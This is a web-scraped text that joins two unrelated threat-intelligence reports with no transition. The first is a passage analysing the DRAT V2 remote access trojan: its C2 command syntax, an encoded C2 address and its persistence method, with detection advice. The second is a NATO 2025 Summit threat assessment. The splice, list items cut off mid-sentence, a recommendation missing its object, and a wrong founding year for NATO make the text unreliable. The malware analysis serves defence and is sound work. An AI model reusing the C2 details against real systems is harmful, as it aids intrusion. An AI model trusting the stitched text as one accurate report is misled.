        <p>The DRAT V2 command protocol is distinguished by the use of tilde (~) and pipe (|) characters as delimiters. Upon establishing connectivity with its C2 infrastructure, the malware enters a passive state, awaiting inbound instructions from the server. These instructions span nine discrete command types (<strong>Table 1</strong>), encompassing capabilities such as host reconnaissance, file management, and direct execution. Each command follows a deterministic format, allowing the operator to orchestrate post-compromise actions with consistency and low overhead.</p>

        <p><strong><em>Table 1:</em></strong> <em>DRAT V2 commands (Source: Recorded Future)</em></p>
        <p>This command set enables TAG-140 to support a range of post-exploitation objectives, including host reconnaissance, data staging, and potential lateral movement. Notably, DRAT V2 extends the functionality of its predecessor by incorporating support for arbitrary command execution. <strong>Appendix B</strong> provides detailed breakdowns of each command, including parameters.</p>
        <p><strong>Figure 5</strong> shows an example of the C2 communication between an infected host and the C2. In this example, the C2 server sends the command exec_this_comm~whoami, which tells the infected host to execute the command whoami. The infected host then responds with the output of the command.</p>

        <h2>DRAT vs DRAT V2</h2>
        <p>This comparative analysis highlights the technical and operational differences between the original DRAT and DRAT V2. The shift in development platforms marks a significant architectural transition that affects how the malware is compiled, executed, and potentially detected. Although both variants maintain similar core functionalities as lightweight RATs, DRAT V2 introduces meaningful enhancements in its command structure, C2 obfuscation techniques, and communication protocol while also minimizing its use of string obfuscation. These adaptations likely reflect TAG-140’s continued efforts to evolve their tooling for improved evasion, modularity, and flexibility in post-exploitation operations.</p>
        <h3>Command Header Variation</h3>
        <p>While both DRAT variants implement similar commands for remote administration, each version uses distinct naming conventions for command headers. For instance, DRAT’s system information command is labeled getInformitica, whereas DRAT V2 uses initial_infotonas. DRAT V2 also introduced a new command, exec_this_comm, which enables arbitrary shell command execution on the infected host, an enhancement not present in the original DRAT and indicative of expanded post-exploitation capabilities. The below comparison table (<strong>Table 2</strong>) presents a detailed, line-by-line breakdown of request and response headers across both versions. In that table, command mappings highlighted in green denote commands that are functionally retained across both variants, while items highlighted in yellow represent new additions exclusive to DRAT V2.</p>

        <h3>Text Format in C2 Communications</h3>
        <p>Both versions leverage text-based communication protocols for C2 interactions. However, they differ in encoding requirements: DRAT V2 accepts commands in both Unicode and ASCII, but always responds in ASCII, whereas the original DRAT mandates Unicode for both input and output (<strong>Figure 6</strong>).</p>

        <h4>Differences in System Information</h4>
        <p>The system information response of both versions includes many similarities, but several differences include the text in Unicode, different command request headers, and WinDefender instead of win-def, both of which are hard-coded. Finally, the format of the Windows version in the system information response varies between DRAT and DRATV2. DRAT simply returns the value from the registry key, Software\Microsoft\Windows NT\CurrentVersion\ProductName, while DRAT V2 gets the Windows version using the API call GetVersionExW() and returns a custom string that is Base64-encoded in the source code. <strong>Table 3</strong> outlines the differences between the two commands.</p>

        <p>In both DRAT variants, the C2 information is Base64-encoded. DRAT encodes the C2 IP address directly, while DRAT V2 modifies its approach to C2 obfuscation by prepending one of the following strings to the IP address prior to Base64 encoding:</p>
        <ul>
          <li>&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;</li>
          <li>XXXXXXXXXXXXXXXXXXXXXX</li>
        </ul>
        <div>
          <div>
            <div>Example encoded C2 IP with prefix: PD48Pjw+PD48Pjw+PD48Pjw+PD48PjE4NS4xMTcuOTAuMjEy<br />Example decoded C2 IP with prefix: &lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;185.117.90.212</div>
          </div>
        </div>
        <p>These prepended patterns likely serve as rudimentary integrity checks or help prevent trivial decoding by analysts and automated tools.</p>
        <h3>String Obfuscation</h3>
        <p>String obfuscation strategies also differ between the variants. DRAT employs a more extensive scheme, using a substitution algorithm to encode both commands and operational strings. DRAT V2, on the other hand, selectively obfuscates strings, such as Windows version and C2 information, but leaves command headers in plaintext. This limited obfuscation approach in DRAT V2 may represent a trade-off between stealth and parsing reliability.</p>

          <li>Block or monitor outbound TCP connections to uncommon destination ports used by DRAT V2 for C2 operations, such as 3232, 6372, and 7771. Monitor anomalous TCP traffic that does not match known protocols that target high-numbered ports.</li>
          <li>Inspect network traffic for outbound command responses and inbound shell command instructions (<strong>Appendix B</strong>) encoded in Base64, ASCII, or Unicode formats. Emphasize traffic decoding and inspection, especially over TCP sessions established to unusual ports.</li>
          <li>Use the detection rules in this report to identify DRAT V2 execution and persistence via registry run keys, file-based loaders, and encoded C2 patterns. Deploy custom YARA rules to detect both .NET and Delphi-compiled DRAT samples.</li>
          <li>Deploy detection logic to monitor , which invokes remote scripts or launches secondary payloads. This is a key component in the infection chain, where malicious HTA scripts fetch and launch DRAT loaders like BroaderAspect.</li>
          <li>Monitor registry modification events, particularly those involving HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run. TAG-140 uses these for persistence by executing DRAT V2 via disguised filenames in C:\Users\Public&lt;/span&gt;.</li>
        </ul>
        <h2>Outlook</h2>
        <p>TAG-140’s deployment of DRAT V2 is consistent with the group’s long-standing practice of maintaining a broad and interchangeable suite of remote access trojans. This continued diversification complicates attribution, detection, and monitoring activity. DRAT V2 appears to be another modular addition rather than a definitive evolution, reinforcing the likelihood that TAG-140 will persist in rotating RATs across campaigns to obscure signatures and maintain operational flexibility.</p>
        <p>Despite these challenges, the DRAT V2 infection chain exhibits limited use of defensive evasion or anti-analysis techniques. The absence of code obfuscation, sandbox evasion, or complex loader behaviors increases the feasibility of early detection through basic telemetry and static analysis. Security teams should anticipate continued experimentation with malware tooling and infection chains. Monitoring for spearphishing infrastructure, loader reuse, and behavioral indicators, rather than specific malware families, will be critical in sustaining visibility into TAG-140 activity.</p>

        </p>
        <h2>Executive Summary</h2>
        <p>On June 24 and 25, 2025, representatives of all 32 members of the North Atlantic Treaty Organization (NATO) will convene in The Hague, the Netherlands, for the 2025 NATO Summit. With each member’s head of state or government in attendance, the summit represents a high-profile diplomatic event taking place amid heightened geopolitical uncertainty and internal alliance tensions. Key issues, such as the ongoing war in Ukraine, economic volatility, rising Euroscepticism, and concern over the United States’ (US) commitment to NATO going forward, are all likely to dominate the agenda.</p>
        <p>The complex geopolitical backdrop of the 2025 NATO Summit almost certainly increases its appeal as a target for a wide spectrum of threat actors, including state-sponsored influence operations groups and cyber threat actors, cybercriminals, and hacktivists. Insikt Group assesses that malign influence operations, cyber-espionage activity, and a measurable uptick in cybercriminal and hacktivist activity likely represent the three primary threat vectors to the 2025 NATO Summit. Russian and Chinese influence networks will almost certainly seek to exploit the summit to amplify perceptions of NATO disunity and undermine its credibility as a reliable security partner. In parallel, Russian state-sponsored cyber actors are highly likely to conduct targeted espionage against NATO-affiliated entities and personnel, while Chinese cyber threat actors are more likely to pursue opportunistic intrusions to glean insight into alliance policies and future planning. Hacktivist and cybercriminal actors are already attempting to capitalize on the summit’s geopolitical visibility for financial gain and political messaging, based on closed forum references to NATO and ongoing targeting of NATO member states.</p>
        <p>Security officials are simultaneously preparing extensive physical security measures to safeguard the event. While direct attacks on the summit by Russian hybrid actors –– encompassing conventional and irregular military forces –– are unlikely, tactics such as sabotage, vandalism, weaponized migration, and provocative military signaling will very likely continue to pressure NATO member states around the time of the event, particularly allies in Eastern Europe. At the time of publication, Insikt Group assesses that protests during the summit are very likely, but risks associated with protest activities are largely mitigated through proactive security measures. Additionally, we have not observed any credible evidence suggesting that violent non-state actors are planning or expressing intent to target the summit.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>We assess NATO’s ability to project unified geopolitical and military strength is likely more uncertain than any time in recent years, driven by US rhetoric questioning the alliance’s utility, rising political influence of Eurosceptic far right parties in several NATO member states, and Russia’s continued efforts to undermine NATO unity via its military campaign in Ukraine and hybrid sabotage and influence operations in Europe.</li>
          <li>Russian hybrid threats, including sabotage of critical infrastructure, vandalism, weaponized migration, and coercive military posturing, will very likely continue to target European countries ahead of and following the 2025 NATO Summit, particularly if the summit results in significant action regarding Ukraine –– with the Baltic states, Poland, and Germany likely at highest risk.</li>
          <li>Both Russia and China’s own influence ecosystems will almost certainly attempt to shape public opinion around the 2025 NATO Summit by portraying the alliance as aggressive, divisive, and divided.</li>
          <li>Malign influence actors, particularly from Russia, are likely to use artificial intelligence (AI)-generated media in an effort to discredit NATO leadership, delegitimize summit outcomes, and further inflame tensions among member states.</li>
          <li>Cybercriminal and hacktivist activity referencing NATO has surged across dark web and special-access forums in the months leading up to the 2025 NATO Summit, very likely signaling a heightened risk of ideologically driven and financially motivated multi-vector campaigns targeting NATO member states and defense-affiliated entities.</li>
          <li>Russian state-aligned threat groups, particularly those linked to the SVR, FSB, and GRU, are highly likely to conduct targeted operations against entities and personnel associated with the 2025 NATO Summit.</li>
          <li>Chinese state-sponsored groups tasked with the collection of foreign intelligence, particularly those under the Ministry of State Security, are likely to engage in some level of opportunistic cyber-espionage operations against select attendees with the goal of understanding summit-related policy discussions and outcomes.</li>
          <li>The Netherlands’ extensive security posture around the 2025 NATO Summit will very likely mitigate the scope, sophistication, and impact of physical security threats to the event from violent non-state actors, including terrorists, violent extremists, criminal organizations, and disruptive protest movements.</li>
        </ul>
        <h2>Strategic Threat Environment</h2>
        <p>2025 NATO Summit Likely Pivotal for Alliance’s Future Unity</p>
        <p>The 2025 NATO Summit comes at a time when the alliance’s ability to project unified geopolitical and military strength is likely more uncertain than any time in recent years, driven by US rhetoric questioning the alliance’s utility; rising political influence of Euroskeptic far right parties in several NATO member states; and Russia’s continued efforts to undermine NATO unity via its military campaign in Ukraine, and hybrid sabotage and influence operations in Europe.</p>
        <p>The US government’s public messaging concerning its commitment to NATO has been inconsistent throughout President Donald Trump’s first and second terms. In 2025, President Trump suggested that the US’s commitment to Article 5 of NATO’s founding treaty would depend on a given NATO state’s defense spending, <a href="https://www.theguardian.com/us-news/2025/mar/07/donald-trump-nato-alliance-us-security-support">stating</a>, “If they don’t pay, I’m not going to defend them.” In contrast, in 2017, President Trump <a href="https://www.atlanticcouncil.org/blogs/natosource/exclusive-trump-discovers-article-5-after-disastrous-nato-visit/?utm_source=chatgpt.com">stated</a>, “Absolutely, I’d be committed to Article 5.”</p>
        <p>Secretary of State Marco Rubio <a href="https://kyivindependent.com/nato-funding-explained-as-trump-mulls-cuts/">announced</a> that all NATO members will be expected to spend 5% of their GDP on defense over the next decade, an increase from the previous benchmark of 2%. Although Rubio emphasized that the US remains committed to supporting NATO, notes from an internal Trump Administration proposal <a href="https://apnews.com/article/state-department-funding-cuts-trump-diplomacy-8305713dc6da1b95811486b62bf46582">revealed</a> plans to reduce the amount of money the US would contribute to NATO’s budget. The US currently <a href="https://www.nato.int/cps/uk/natohq/topics_67655.htm?selectedLocale=en">provides</a> roughly 16% of the alliance’s funding.</p>
        <p>In some key NATO states, the rising political <a href="https://carnegieendowment.org/research/2024/04/charting-the-radical-rights-influence-on-eu-foreign-policy?center=russia-eurasia&amp;lang=en">influence</a> of far-right parties that are skeptical of NATO and sympathetic to Russia likely complicates their ability to reinforce NATO commitments. For example, France’s Rassemblement National (RN) has historically advocated for France’s withdrawal from NATO. Though the RN has recently moderated its position, its historically anti-NATO position risks complicating French President Emmanuel Macron’s ability to achieve consensus on increased French defense spending for NATO. Germany’s Alternative für Deutschland (AfD) has questioned NATO’s continued utility and has advocated for closer Germany-Russia ties.</p>
        <p>Differences in NATO states’ probable responses to Russia’s multi-pronged attempts to weaken NATO and its allies will almost certainly strain NATO’s ability to project a unified response to Russia’s actions. Though NATO has, from its founding in 1945, been primarily concerned with resisting Russian aggression, in the last two years, Russia has significantly escalated its aggression towards NATO and its allies, with Moscow’s full-scale invasion of Ukraine, escalating sabotage operations in NATO territory, and widespread influence operations aimed at undermining public confidence in Western democracy and manipulating elections in favor of pro-Russia candidates.</p>
        <h4>Profiles of Key Players</h4>
        <h5>United States — Unpredictable NATO Leader</h5>
        <p>Inconsistent statements by senior US officials about NATO’s utility and how much to resist Russian aggression likely make it difficult to predict the US’s 2025 NATO Summit priorities, which will have significant influence over the tone of the summit and the text of the Summit Declaration. That said, the US almost certainly will <a href="https://www.heritage.org/global-politics/report/what-success-story-looks-top-us-priorities-the-june-2025-nato-summit-the">call</a> for NATO member states to spend 3.5 to 5% of their GDP on defense, judging from <a href="https://www.straitstimes.com/world/united-states/trump-says-nato-members-should-raise-defence-spending-to-5-of-gdp?utm_source=chatgpt.com">past</a> statements by President Trump. The US is also likely to push for NATO’s increased focus on China-nexus threats to NATO territory, judging from the Trump administration’s emphasis on resisting Chinese global aggression. The US’s inconsistent policies toward Russia — ranging from <a href="https://www.bbc.com/news/articles/cg5q0mev07lo">supporting</a> Russia’s view that Kyiv started the Russia-Ukraine war to <a href="https://www.cnn.com/2025/05/27/politics/russia-sanctions-trump-ukraine-war">calling</a> for additional sanctions on Russia — make it difficult to predict the US’s stance on Russia at the summit. <a href="https://www.euractiv.com/section/defence/news/nato-plans-to-sideline-zelenskyy-at-june-summit-to-keep-trump-happy/">Reporting</a> suggests senior NATO officials — including the NATO Secretary General — are considering deemphasizing Ukraine at the summit, potentially including not inviting Ukrainian President Volodymyr Zelensky, to avoid alienating President Trump. We assess this suggests that at least some NATO states might be willing to compromise on their priorities to ensure the US remains invested in the alliance.</p>
        <h5>Poland — Concerns about Existential Threats from Moscow Drive Militarization</h5>
        <p>Poland’s presidential election likely raises questions about Warsaw’s level of support for Ukraine at the 2025 NATO Summit and beyond. Law and Justice (PiS) candidate Karol Nawrocki won the runoff on June 2, 2025. Nawrocki has stated that he would veto Ukraine’s accession to NATO, suggesting Warsaw is likely to be less inclined to support additional NATO aid to Ukraine. However, Nawrocki is likely to remain committed to building up Poland’s military capabilities to resist Russian aggression. Warsaw’s history of being invaded by Russia and Putin’s <a href="https://www.legal-tools.org/doc/tt382m/pdf">rhetoric</a> undermining Poland’s sovereignty almost certainly have led Poland to conclude that NATO strength is one of the only deterrents to Russian aggression within Poland, potentially including territorial incursions. Polish leaders have <a href="https://www.politico.eu/article/donald-tusk-plan-train-poland-men-military-service-russia/">announced</a> plans to increase the size of Poland’s standing army from 200,000 to 500,000 and provide military training to every Polish man.</p>
        <h5>United Kingdom — Member of Pro-NATO Unity Bloc</h5>
        <p>The United Kingdom (UK) is likely to strongly <a href="https://www.gov.uk/government/speeches/prime-ministers-oral-statement-to-the-house-of-commons-25-february-2025?utm_source=chatgpt.com">advocate</a> for continued NATO unity to resist threats, including an increase in NATO assistance to Ukraine. The UK has announced a commitment to increase its defense spending to 2.5% of its GDP by 2030. Notably, UK Prime Minister Keir Starmer has <a href="https://www.bbc.com/news/articles/clyelpzqn28o">backed</a> NATO membership for Ukraine despite US objections, suggesting there could be tension between the US and UK on this issue at the summit.</p>
        <h5>Germany — Member of Pro-NATO Unity Bloc</h5>
        <p>Germany is likely to be more committed to NATO unity and increased defense spending than it has in previous NATO summits, as it adopts a position similar to that of the UK and France. Senior German officials have <a href="https://www.reuters.com/world/berlin-backs-trumps-demand-hike-nato-spending-target-5-2025-05-15/?utm_source=chatgpt.com">pledged</a> to spend 5% of Germany’s GDP on defense. Merz’s government <a href="https://responsiblestatecraft.org/german-defense-spending-increase/">voted</a> to revise Germany’s constitution to allow increased defense spending and facilitate the largest German rearmament since World War II. Chancellor Merz has also expressed support for Ukraine joining NATO, though he has rejected the idea of sending NATO troops to Ukraine.</p>
        <h5>France — Member of Pro-NATO Unity Bloc</h5>
        <p>France’s position at the 2025 NATO Summit is likely to be broadly similar to that of the UK and Germany. French President Emmanuel Macron has <a href="https://www.politico.eu/article/macron-urges-europe-to-boost-defense-spending-to-over-3-percent-of-gdp/">advocated</a> for NATO states to increase their defense spending to 3 to 3.5% of their GDPs. France has <a href="https://www.france24.com/en/europe/20250311-european-nato-paris-ukraine?utm_source=chatgpt.com">called</a> for “credible security guarantees” for Ukraine via a coordinated NATO <a href="https://www.lemonde.fr/en/europe/article/2025/03/11/macron-hosts-military-chiefs-from-30-countries-to-discuss-ukraine_6739036_143.html?utm_source=chatgpt.com">strategy</a>, including a pathway for Ukraine to join NATO. Macron is also likely to <a href="https://www.military.com/daily-news/2025/03/04/macron-discuss-nuclear-deterrence-european-allies-look-frances-unique-strategy.html?utm_source=chatgpt.com">advocate</a> for the expansion of nuclear deterrence measures to strengthen NATO’s defenses.</p>
        <h5>Hungary — Efforts to Balance NATO Membership with Close Russia Relations Complicate NATO Unity</h5>
        <p>Hungary is likely to take a multifaceted approach that aims to balance participation in core NATO functions, including defense spending targets and collective defense mechanisms, with avoiding providing direct military assistance to Ukraine, likely to preserve Hungary’s relationship with Russia. Hungary has <a href="https://www.belfercenter.org/publication/us-engagement-hungary-reshaping-natos-collective-alliance?utm_source=chatgpt.com">met</a> NATO’s longtime 2% defense spending target, though its efforts to maintain a positive relationship with Russia are likely to complicate NATO’s ability to project a unified response to Russian aggression. Hungary’s plans to <a href="https://www.gbnews.com/news/world/viktor-orban-hungary-nato-membership?utm_source=chatgpt.com">determine</a> a way to avoid operations outside of NATO territory suggest it could complicate NATO responses to conflicts, even outside of the Russia-Ukraine war.</p>
        <h5>Türkiye — Pivotal Independent Player, Most Well-Positioned to Influence NATO Priorities</h5>
        <p>Türkiye’s strong military and unique diplomatic positioning to broker talks with Western powers as well as Russia and China means it likely feels empowered to push NATO to adopt Turkish priorities. For example, Türkiye initially <a href="https://foreignpolicy.com/2024/01/28/turkey-sweden-nato-erdogan-foreign-policy-history-us-europe-west/">opposed</a> Swedish admission into NATO due to Sweden providing asylum for members of the Kurdistan Workers’ Party, a political party Ankara considers a terrorist organization. Türkiye eventually <a href="https://www.npr.org/2024/01/27/1227418505/f-16s-turkey-sweden-nato-kurds-greece">agreed</a> to Swedish admission into NATO after securing key concessions from the US, including F-16 fighter jets.</p>
        <p>Türkiye <a href="https://breakingdefense.com/2024/10/turkish-defense-spending-to-reach-record-high-amid-neighboring-conflicts/">announced</a> plans in October 2024 to increase its defense and security spending in 2025 to $47 billion, its highest-ever military budget. Ankara has <a href="https://www.straitstimes.com/world/europe/turkey-ready-to-host-russia-ukraine-peace-talks-erdogan-tells-putin?utm_source=chatgpt.com">offered</a> up its services as a mediator in the Russia-Ukraine war, though Ankara’s often close relations with Moscow make it unclear to what extent Türkiye would be able to be a neutral arbiter between Moscow and Kyiv. More broadly, Türkiye is likely to seek NATO support for its own national priorities, including counterterrorism, as well as a lifting of NATO arms embargoes on Türkiye, which Ankara <a href="https://nordicmonitor.com/2024/07/erdogan-seeks-lifting-of-unofficial-embargoes-on-turkey-at-nato-summit/?utm_source=chatgpt.com">argues</a> undermines Turkish defense capabilities.</p>
        <h3>Hybrid Threats to NATO Member States</h3>
        <p>Russian hybrid threats –– including sabotage of critical infrastructure, vandalism, weaponized migration, and coercive military posture –– will very likely continue to target European countries ahead of and following the 2025 NATO Summit. While these operations are unlikely to directly target the summit event itself, threats to the critical infrastructure of NATO member countries are likely heightened as Moscow seeks to destabilize member states and exploit divisions within the alliance. Hybrid threats will almost certainly increase their targeting of NATO member countries following the summit if it results in significant action regarding Ukraine, such as a joint commitment to further military aid to Kyiv. In January 2025, the Finnish Defence Forces <a href="https://puolustusvoimat.fi/documents/1948673/2014902/PV_sotilastiedustelu_raportti_EN_2025_web.pdf/c0125ed9-1467-23e7-e7b6-a7891c4fb5fe/PV_sotilastiedustelu_raportti_EN_2025_web.pdf">assessed</a> that Russia “will likely increase the use of all hybrid methods as it seeks to cause disunity within NATO and the European Union,” including cyber and information influencing, coercive use of energy exports, targeting of energy and other critical infrastructure, weaponizing immigration, and intelligence operations.</p>
        <h4>Russian Hybrid Warfare Units</h4>
        <p>Insikt Group identified at least five Russian units dedicated to hybrid warfare operations, including sabotage, assassinations, arson attacks, espionage, and recruitment of foreign agents (<strong>Table 1</strong>). The Kremlin also very likely <a href="https://www.mi5.gov.uk/director-general-ken-mccallum-gives-latest-threat-update">employs</a> individuals not directly affiliated with its security or intelligence services to <a href="https://tvn24.pl/plus/programy/czarno-na-bialym/szpiedzy-w-polsce-czy-wobec-takiego-zagrozenia-jestesmy-bezradni-reportaz-piotra-swierczka-vc8358848">conduct</a> hybrid threat activity, in an effort to prevent discovery and complicate attribution. For example, GRU Military Unit 54654 very likely recruits operatives without prior military contracts or connections to the Russian government to avoid identification, including recruiting foreign students studying in Russia, Russian students abroad, and criminal organizations in Russia and abroad.</p>
        <p>Recent arrests and incidents of potential sabotage across Europe <a href="https://www.politico.eu/article/europe-russia-hybrid-war-vladimir-putin-germany-cyberattacks-election-interference/">indicate</a> that recruits are largely young men, Russian-<a href="https://www.theguardian.com/technology/2025/mar/18/russia-criminal-networks-drive-increase-sabotage-europol">speaking</a> but not Russian citizens, <a href="https://www.cia.gov/static/DCIA_Bill_Burns_MI6_Chief_Richard_Moore_with_FT_Editor_Roula_Khalaf_Transcript.pdf">often</a> with a criminal background and <a href="https://www.occrp.org/en/investigation/make-a-molotov-cocktail-how-europeans-are-recruited-through-telegram-to-commit-sabotage-arson-and-murder">recruited</a> via Telegram. For example, Polish Foreign Minister Radek Sikorski <a href="https://www.bbc.com/news/videos/ceqgxv7ejxwo">stated</a> in an interview that Russia used Telegram to recruit the perpetrators of the May 2024 arson attacks on a Warsaw shopping mall. In March 2025, the Finnish Defence Forces <a href="https://puolustusvoimat.fi/documents/1948673/2014902/PV_sotilastiedustelu_raportti_EN_2025_web.pdf/c0125ed9-1467-23e7-e7b6-a7891c4fb5fe/PV_sotilastiedustelu_raportti_EN_2025_web.pdf">assessed</a> that “attempts to recruit human sources online, and particularly on pro-Russian social media platforms, are likely to become more common.” Similarly, Moscow can also likely co-opt vessels affiliated with its shadow fleet to conduct low-sophistication destructive actions targeting submarine infrastructure, such as anchor dragging, as these assets likely draw less scrutiny.</p>

        <h5>Sabotage</h5>
        <p>Russia very likely aims to target European critical infrastructure with hybrid cyber-kinetic operations, regardless of the outcome of current peace negotiations on Ukraine. Based on recent incidents, countries neighboring Russia –– Estonia, Finland, Latvia, Lithuania, and Poland –– likely <a href="https://jamestown.org/program/poland-on-the-frontlines-against-russias-shadow-war/?utm_source=All+Subscribers&amp;utm_campaign=cf94211450-EMAIL_CAMPAIGN_2025_02_14_07_49_COPY_01&amp;utm_medium=email&amp;utm_term=0_-a46e3b4ee2-155273798&amp;mc_cid=cf94211450&amp;mc_eid=1d39ed9d2e">represent</a> the most attractive targets for sabotage operations. Additionally, countries providing the strongest support to Ukraine, such as Germany and Poland, are almost certainly at greater risk of physical threats than countries that do not provide significant aid, such as Hungary, which Moscow is unlikely to directly target. Specifically, Insikt Group assessed in April 2025 that Russia’s threat perception and intent to target European energy entities would likely increase following the European Union (EU)’s <a href="https://commission.europa.eu/news/roadmap-fully-end-eu-dependency-russian-energy-2025-05-06_en">announcement</a> of a framework to eliminate Russian fossil fuel imports by 2027.</p>
        <p>Russia-directed sabotage attacks targeting the critical infrastructure and key government and military facilities of European countries have almost certainly <a href="/research/russian-sabotage-activities-escalate-amid-fraught-tensions">increased</a> since 2022. Recent incidents suggest that these operations largely involve low-sophistication tactics with a degree of plausible deniability and obfuscated links to Moscow, often initially appearing as accidents or single criminal events, complicating attribution and identification of a larger strategic trend. For example, in March 2025, Polish prosecutors <a href="https://www.politico.eu/article/russia-spy-belarusian-refugee-warsaw-mall-fire-prosecutor/">announced</a> that an alleged Belarusian refugee masquerading as an opposition activist had set fire to a Warsaw supermarket on Russia’s behalf in April 2024, and Lithuanian prosecutors <a href="https://www.bbc.com/news/articles/c757kpk21d9o">attributed</a> an arson attack on an Ikea store in Vilnius in May 2024 to two teenagers recruited by Russia’s Main Directorate of the General Staff of the Armed Forces (GRU). In December 2024, the Federal Prosecutor’s Office in Germany announced charges against three Russian-German nationals for reportedly surveying a US military base in Grafenwöhr, a weapons factory in Bayreuth, and military facilities and railway lines to support sabotage operations using explosives. According to the Center for Strategic and International Studies (CSIS), Russia-directed sabotage attacks in Europe <a href="https://www.csis.org/analysis/russias-shadow-war-against-west">tripled</a> between 2023 and 2024 (from 12 to 34 attacks), after quadrupling between 2022 and 2023 (from 3 to 12 attacks).</p>
        <h5>Threats to Submarine Cable Infrastructure</h5>
        <p>Sabotage operations targeting submarine cables off the coast of Europe almost certainly represent a relatively low-effort, high-reward vector for targeting European critical infrastructure. In June 2023, Insikt Group <a href="/research/escalating-global-risk-environment-submarine-cables">assessed</a> that Russia’s ongoing war against Ukraine was very likely fueling physical attacks and intelligence collection efforts against the submarine cable system to undermine the economic, diplomatic, and national security objectives of the US and its NATO allies. Specifically, Russia almost certainly presents the greatest direct threat to submarine cables in the North and Baltic Seas.</p>
        <p>Insikt Group identified four incidents involving damage to eight submarine cables in the Baltic Sea in 2024 and 2025: January 2025 <a href="https://www.svt.se/nyheter/utrikes/uppgifter-om-nytt-kabelbrott-i-ostersjon">damages</a> to the C-Lion1 cable connecting Germany and Finland; January 2025 <a href="https://www.svt.se/nyheter/utrikes/lettland-utreder-sabotage-efter-kabelbrott-utanfor-gotland">damages</a> to the Sweden-Latvia cable; December 2024 <a href="https://www.theguardian.com/world/2024/dec/26/finnish-coastguard-boards-eagle-s-oil-tanker-suspected-of-causing-power-cable-outages">damages</a> to four submarine internet cables (likely the Finland Estonia Connection 1, Finland Estonia Connection 2, Baltic Sea Submarine Cable, and C-Lion1) and the Estlink-2 power cable; and November 2024 damages to the C-Lion1 and BCS East-West Interlink. Prosecutors have attributed these damages to vessels, some with connections to Russia, dragging their anchors; for example, the Eagle S vessel behind the December 2024 cable cuts is <a href="https://www.lloydslist.com/LL1151955/Russia-linked-cable-cutting-tanker-seized-by-Finland-was-loaded-with-spying-equipment">suspected</a> to be part of Russia’s shadow fleet and reportedly carried surveillance equipment. While none of these incidents caused prolonged outages or communication disruptions due to the availability of alternate routes for data transmission, increased societal concerns about the vulnerability of critical infrastructure had a <a href="https://www.rand.org/pubs/commentary/2025/01/countering-russias-shadow-fleet.html">clear</a> <a href="https://katsaus.supo.fi/en/russian-sabotage-in-europe">psychological</a> <a href="https://news.postimees.ee/8255914/vox-populi-of-political-parties-lauri-laanemets-if-russian-ships-reach-estonian-waters-it-is-too-late?cx_testId=25&amp;cx_testVariant=cx_1&amp;cx_artPos=0#cxrecs_s">impact</a> on northern European populations. A more coordinated attack on submarine critical infrastructure could cause disruptions to business operations, financial losses, and communications disruptions, raising the risk of economic ramifications to northern and eastern Europe. In 2024, Estonian power provider Elering <a href="https://www.politico.eu/article/russia-sabotage-undersea-cables-baltic-sea-europe-war/">reported</a> that energy bills spiked by 10% due to a technical problem with a power cable, with board member Erkki Sapp stating that energy infrastructure can handle any single event, but “if there are several of these sorts of events, then this may lead to issues with security of supply.”</p>
        <p>In addition to threats to critical infrastructure, Moscow has very likely attempted to <a href="https://mwi.westpoint.edu/weaponized-migration-in-eastern-europes-frozen-north-do-not-overlook-russian-hybrid-warfare/">weaponize</a> refugee flows in an effort to foment domestic unrest and exploit concerns about immigration in countries bordering Russia and Belarus. In October 2024, Poland temporarily <a href="https://www.politico.eu/article/poland-prime-minister-donald-tusk-eu-asylum-ban-russia-belarus-migration-security/">suspended</a> asylum rights for migrants entering the country via Belarus, over concerns that Russia had orchestrated an influx of migrants at that border as part of hybrid tactics to destabilize Poland. Similarly, Finland <a href="https://apnews.com/article/finland-russia-border-migration-313b2a1846f4aa4b349fa577ce8c39a4">closed</a> its last border crossing with Russia in November 2023 after accusing Moscow of facilitating the crossing of approximately 1,000 migrants without valid documentation. Throughout 2021 and 2022, Lithuania <a href="https://warsawinstitute.org/tightening-immigration-and-border-policy-initiatives-in-the-baltics/">documented</a> similar efforts by the Belarusian government to push migrants across the border. As such, the weaponization of migration across Russian and Belarusian borders with NATO member states, particularly Finland, Poland, Estonia, Latvia, and Lithuania, likely remains a viable tactic to attempt to destabilize these countries.</p>
        <h5>Coercive Military Posture</h5>
        <p>Russia’s plans to expand its military capabilities near the border with Finland and the Baltic states will very likely focus on increasing military presence and intelligence capabilities. Moscow’s ability to implement these changes has been constrained by its ongoing military operations in Ukraine, although it has already taken several key steps in 2024 –– most notably, the creation of the Leningrad Military District bordering Finland and the Baltics, which Moscow frames as its response to NATO expansion. Russia reportedly <a href="https://www.thebarentsobserver.com/news/kola-and-in-karelia-likely-to-get-tens-of-thousands-of-new-soldiers/423579#:~:text=A%20completely%20new%20army%20corps,the%2080th%20Motorised%20Infantry%20Brigade">aims</a> to increase the size of its armed forces by 350,000 by 2026, of which up to 50,000 will deploy to the Leningrad Military District, potentially <a href="https://www.helsinkitimes.fi/finland/finland-news/domestic/25983-russia-s-military-buildup-near-finland-stalls-amid-ukraine-war.html">increasing</a> troop numbers near Finland from approximately 30,000 to 80,000. While Finnish and Latvian intelligence services <a href="https://www.helsinkitimes.fi/finland/finland-news/domestic/25983-russia-s-military-buildup-near-finland-stalls-amid-ukraine-war.html">have</a> <a href="https://eng.lsm.lv/article/society/defense/06.05.2025-latvias-intelligence-service-russia-is-undergoing-military-reform.a597782/">assessed</a> that planned troop increases will not be completed for several years, Russia will very likely seek to ramp up implementation of military reforms should the conflict in Ukraine decrease in intensity, focusing on increasing military presence and capabilities in its northwestern regions.</p>
